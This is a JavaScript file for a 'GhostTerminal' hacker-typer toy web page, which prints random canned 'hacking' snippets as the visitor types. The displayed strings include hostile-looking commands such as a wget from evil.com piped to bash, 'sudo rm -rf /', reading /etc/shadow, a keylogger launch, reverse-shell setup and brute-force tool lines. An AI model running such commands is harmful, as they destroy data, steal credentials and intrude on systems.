const content = document.getElementById('content');
const terminal = document.getElementById('terminal');

let keyBuffer = '';
let lastIndex = -1;
let commandHistory = [];
let historyIndex = -1;
let currentInput = '';
let usedSnippets = new Set(); // Track used snippets to avoid repetition

// Performance optimization: limit terminal lines
const MAX_LINES = 500;
let currentLineCount = 0;

// Mobile detection
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

const bootLines = [
  "Booting GhostTerminal...",
  "Loading system modules...",
  "Authenticating keys...",
  "Connection to proxy node established.",
  "Fetching secure shell...",
  "Ready.\n"
];

// Expanded and more diverse code snippets
const codeSnippets = [
  [
    "[+] Establishing secure connection...",
    ">>> AUTH_TOKEN = \"9f2a7c1d4b9e\"",
    ">>> Sending authentication token...",
    ">>> Access granted.\n"
  ],
  [
    "function connectToServer(ip) {",
    "  const socket = new WebSocket(ip);",
    "  socket.onopen = () => {",
    "    console.log('Connected');",
    "    socket.send('AUTH_TOKEN');",
    "  };",
    "  socket.onerror = console.error;",
    "}\n"
  ],
  [
    "if (user.isAdmin) {",
    "  grantRootAccess();",
    "} else {",
    "  requestElevation();",
    "}\n"
  ],
  [
    "for (let i = 0; i < packets.length; i++) {",
    "  parsePacket(packets[i]);",
    "}\n"
  ],
  [
    "console.log('System breach attempt detected');\n"
  ],
  [
    "encryptPayload(payload);",
    "uploadTo('darknet://node42');\n"
  ],
  [
    "const fs = require('fs');",
    "fs.writeFileSync('/tmp/root_access.log', 'ACCESS GRANTED');\n"
  ],
  [
    "initializeExploitVector();",
    "while(true) ping('127.0.0.1');\n"
  ],
  [
    "sudo rm -rf /",
    "chmod +x injector.sh",
    "./injector.sh --silent\n"
  ],
  [
    "curl -X POST -d @payload.json http://localhost:8080/exploit\n"
  ],
  [
    "scp exploit.c user@192.168.1.13:/tmp/",
    "tar -czf payload.tar.gz payload/",
    "mv payload.tar.gz /dev/shadow\n"
  ],
  [
    "import hashlib",
    "import base64",
    "key = hashlib.sha256(b'secret').hexdigest()",
    "encoded = base64.b64encode(key.encode()).decode()\n"
  ],
  [
    "class Exploit {",
    "  constructor(target) {",
    "    this.target = target;",
    "    this.payload = this.generatePayload();",
    "  }",
    "  execute() { return this.inject(); }",
    "}\n"
  ],
  [
    "SELECT * FROM users WHERE admin=1;",
    "DROP TABLE sessions;",
    "INSERT INTO logs VALUES ('breach_detected');\n"
  ],
  [
    "mkdir -p /tmp/.hidden",
    "echo 'payload' > /tmp/.hidden/data",
    "chmod 777 /tmp/.hidden/*\n"
  ],
  [
    "wget https://evil.com/shell.sh -O /tmp/s",
    "bash /tmp/s &",
    "rm /tmp/s\n"
  ],
  [
    "iptables -A INPUT -p tcp --dport 22 -j DROP",
    "iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT",
    "iptables-save > /etc/iptables.rules\n"
  ],
  [
    "openssl genrsa -out private.key 2048",
    "openssl req -new -key private.key -out cert.csr",
    "openssl x509 -req -in cert.csr -signkey private.key -out cert.crt\n"
  ],
  [
    "nc -lvp 4444 &",
    "echo 'reverse shell initiated'",
    "python3 -c \"import pty;pty.spawn('/bin/bash')\"\n"
  ],
  [
    "grep -r 'password' /var/log/",
    "find / -name '*.conf' -exec grep -l 'admin' {} \\;",
    "cat /etc/shadow | head -5\n"
  ],
  [
    "python3 -m http.server 8000 &",
    "ngrok http 8000",
    "echo 'tunnel established'\n"
  ],
  [
    "git clone https://github.com/exploit/tool.git",
    "cd tool && make install",
    "./exploit --target 192.168.1.0/24\n"
  ],
  [
    "nohup python3 keylogger.py > /dev/null 2>&1 &",
    "echo $! > /tmp/keylogger.pid",
    "disown\n"
  ],
  [
    "tcpdump -i eth0 -w capture.pcap",
    "wireshark -r capture.pcap &",
    "tshark -r capture.pcap -T fields -e ip.src\n"
  ],
  [
    "hydra -l admin -P wordlist.txt ssh://192.168.1.100",
    "medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh",
    "ncrack -vv --user admin -P pass.txt ssh://192.168.1.100\n"
  ],
  [
    "msfconsole -q",
    "use exploit/multi/handler",
    "set payload windows/meterpreter/reverse_tcp",
    "exploit\n"
  ],
  [
    "airmon-ng start wlan0",
    "airodump-ng wlan0mon",
    "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon\n"
  ],
  [
    "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
    "hashcat -m 0 -a 0 hashes.txt wordlist.txt",
    "echo 'cracking in progress...'\n"
  ],
  [
    "sqlmap -u 'http://target.com/page?id=1' --dbs",
    "sqlmap -u 'http://target.com/page?id=1' -D database --tables",
    "sqlmap -u 'http://target.com/page?id=1' -D database -T users --dump\n"
  ],
  [
    "volatility -f memory.dump imageinfo",
    "volatility -f memory.dump --profile=Win7SP1x64 pslist",
    "volatility -f memory.dump --profile=Win7SP1x64 hashdump\n"
  ],
  [
    "binwalk -e firmware.bin",
    "strings firmware.bin | grep -i password",
    "hexdump -C firmware.bin | head -20\n"
  ]
];

// Enhanced command system
const commands = {
  help: [
    "Available commands:",
    "  help     - show this help",
    "  ls       - list fake files",
    "  ps       - show running processes",
    "  whoami   - display current user",
    "  pwd      - print working directory", 
    "  cat      - display file contents",
    "  nmap     - run simulated scan",
    "  netstat  - show network connections",
    "  clear    - clear terminal",
    "  exit     - close terminal"
  ],
  ls: [
    "total 24",
    "drwxr-xr-x  2 ghost ghost 4096 Jun 15 14:32 .",
    "drwxr-xr-x  3 root  root  4096 Jun 15 14:30 ..",
    "-rwx------  1 ghost ghost 1337 Jun 15 14:32 exploit.c",
    "-rw-r--r--  1 ghost ghost  256 Jun 15 14:31 payload.json",
    "-rwx------  1 ghost ghost  512 Jun 15 14:32 injector.sh",
    "-rw-r--r--  1 ghost ghost 2048 Jun 15 14:30 README.md"
  ],
  ps: [
    "  PID TTY          TIME CMD",
    " 1337 pts/0    00:00:01 ghost-shell",
    " 1338 pts/0    00:00:00 exploit-daemon", 
    " 1339 pts/0    00:00:02 network-scanner",
    " 1340 pts/0    00:00:00 payload-injector"
  ],
  whoami: ["ghost"],
  pwd: ["/home/ghost/exploits"],
  cat: [
    "Usage: cat [filename]",
    "Available files: exploit.c, payload.json, injector.sh, README.md"
  ],
  nmap: [
    "Starting Nmap 7.93 ( https://nmap.org )",
    "Scanning 127.0.0.1...",
    "Host is up (0.00012s latency).",
    "Not shown: 999 closed ports",
    "PORT     STATE SERVICE VERSION",
    "22/tcp   open  ssh     OpenSSH 8.9",
    "80/tcp   open  http    Apache 2.4.41",
    "443/tcp  open  https   Apache 2.4.41",
    "8080/tcp open  http    Node.js Express",
    "Scan complete."
  ],
  netstat: [
    "Active Internet connections (w/o servers)",
    "Proto Recv-Q Send-Q Local Address           Foreign Address         State",
    "tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN",
    "tcp        0      0 192.168.1.100:22        192.168.1.1:54321       ESTABLISHED",
    "tcp        0      0 192.168.1.100:443       203.0.113.1:443         ESTABLISHED"
  ],
  clear: "__clear__",
  exit: "__exit__"
};

// Performance optimization: Clean up old lines
function cleanupOldLines() {
  const lines = content.innerText.split('\n');
  if (lines.length > MAX_LINES) {
    const linesToKeep = lines.slice(-MAX_LINES);
    content.innerText = linesToKeep.join('\n');
    currentLineCount = linesToKeep.length;
  }
}

// Enhanced output function with line counting
function addOutput(lines) {
  lines.forEach(line => {
    content.innerText += line + '\n';
    currentLineCount++;
  });
  
  // Clean up if we have too many lines
  if (currentLineCount > MAX_LINES) {
    cleanupOldLines();
  }
  
  scrollToBottom();
}

// On load: boot lines
window.addEventListener('load', () => {
  addOutput(bootLines);
  
  // Initialize mobile controls if on mobile
  if (isMobile) {
    initMobileControls();
  }
});

// Enhanced keypress listener with command history
document.addEventListener('keydown', (e) => {
  // Handle command history navigation
  if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (commandHistory.length > 0 && historyIndex < commandHistory.length - 1) {
      historyIndex++;
      showHistoryCommand();
    }
    return;
  }
  
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (historyIndex > -1) {
      historyIndex--;
      showHistoryCommand();
    }
    return;
  }
  
  // Handle Enter key for command execution
  if (e.key === 'Enter') {
    e.preventDefault();
    if (currentInput.trim()) {
      executeCommand(currentInput.trim());
      currentInput = '';
    }
    return;
  }
  
  // Handle backspace
  if (e.key === 'Backspace') {
    e.preventDefault();
    if (currentInput.length > 0) {
      currentInput = currentInput.slice(0, -1);
      updateInputDisplay();
    }
    return;
  }
  
  // Handle regular character input
  if (e.key.length === 1 && !e.ctrlKey && !e.metaKey) {
    currentInput += e.key;
    keyBuffer += e.key.toLowerCase();
    updateInputDisplay();
    
    // Keep keyBuffer manageable
    if (keyBuffer.length > 10) keyBuffer = keyBuffer.slice(-10);
    
    // Check for command matches in keyBuffer
    for (let cmd in commands) {
      if (keyBuffer.endsWith(cmd)) {
        executeCommand(cmd);
        keyBuffer = '';
        currentInput = '';
        updateInputDisplay();
        return;
      }
    }
    
    // Generate random code output for any other typing
    const block = getRandomBlock();
    addOutput(block);
  }
});

function showHistoryCommand() {
  if (historyIndex >= 0 && historyIndex < commandHistory.length) {
    currentInput = commandHistory[commandHistory.length - 1 - historyIndex];
  } else {
    currentInput = '';
  }
  updateInputDisplay();
}

function updateInputDisplay() {
  // Update cursor position based on current input
  // This is a simple implementation - in a real terminal you'd show the input
  // For now, we'll just ensure the cursor is visible
  scrollToBottom();
}

function executeCommand(cmd) {
  // Add command to history
  if (cmd && !commandHistory.includes(cmd)) {
    commandHistory.push(cmd);
    // Keep history manageable
    if (commandHistory.length > 50) {
      commandHistory = commandHistory.slice(-50);
    }
  }
  historyIndex = -1;
  
  // Show the command being executed
  addOutput([`ghost@terminal:~$ ${cmd}`]);
  
  // Execute the command
  runCommand(cmd);
}

function getRandomBlock() {
  // Reset used snippets if we've used them all
  if (usedSnippets.size >= codeSnippets.length) {
    usedSnippets.clear();
  }
  
  let index;
  let attempts = 0;
  do {
    index = Math.floor(Math.random() * codeSnippets.length);
    attempts++;
    // Prevent infinite loop if all snippets are used
    if (attempts > codeSnippets.length * 2) {
      usedSnippets.clear();
      break;
    }
  } while (usedSnippets.has(index));
  
  usedSnippets.add(index);
  lastIndex = index;
  return codeSnippets[index];
}

function runCommand(cmd) {
  const output = commands[cmd.toLowerCase()];
  
  if (!output) {
    addOutput([`Command not found: ${cmd}`, "Type 'help' for available commands."]);
    return;
  }
  
  if (output === "__clear__") {
    content.innerText = '';
    currentLineCount = 0;
    return;
  }
  
  if (output === "__exit__") {
    addOutput(["Connection terminated.", "Goodbye."]);
    setTimeout(() => {
      window.close();
    }, 2000);
    return;
  }
  
  addOutput(output);
}

function scrollToBottom() {
  requestAnimationFrame(() => {
    terminal.scrollTop = terminal.scrollHeight;
  });
}

// Mobile support functions
function initMobileControls() {
  const mobileControls = document.getElementById('mobile-controls');
  const mobileOverlay = document.getElementById('mobile-overlay');
  const closeOverlay = document.getElementById('close-overlay');
  
  // Show mobile controls
  mobileControls.style.display = 'flex';
  
  // Add event listeners for mobile buttons
  document.getElementById('mobile-help').addEventListener('touchstart', (e) => {
    e.preventDefault();
    executeCommand('help');
  });
  
  document.getElementById('mobile-ls').addEventListener('touchstart', (e) => {
    e.preventDefault();
    executeCommand('ls');
  });
  
  document.getElementById('mobile-nmap').addEventListener('touchstart', (e) => {
    e.preventDefault();
    executeCommand('nmap');
  });
  
  document.getElementById('mobile-clear').addEventListener('touchstart', (e) => {
    e.preventDefault();
    executeCommand('clear');
  });
  
  document.getElementById('mobile-type').addEventListener('touchstart', (e) => {
    e.preventDefault();
    mobileOverlay.style.display = 'flex';
  });
  
  closeOverlay.addEventListener('touchstart', (e) => {
    e.preventDefault();
    mobileOverlay.style.display = 'none';
  });
  
  // Add touch support for generating code
  document.getElementById('mobile-input-area').addEventListener('touchstart', (e) => {
    if (e.target === closeOverlay) return;
    e.preventDefault();
    const block = getRandomBlock();
    addOutput(block);
  });
}

// Prevent zoom on mobile
document.addEventListener('touchstart', function(event) {
  if (event.touches.length > 1) {
    event.preventDefault();
  }
});

let lastTouchEnd = 0;
document.addEventListener('touchend', function(event) {
  const now = (new Date()).getTime();
  if (now - lastTouchEnd <= 300) {
    event.preventDefault();
  }
  lastTouchEnd = now;
}, false);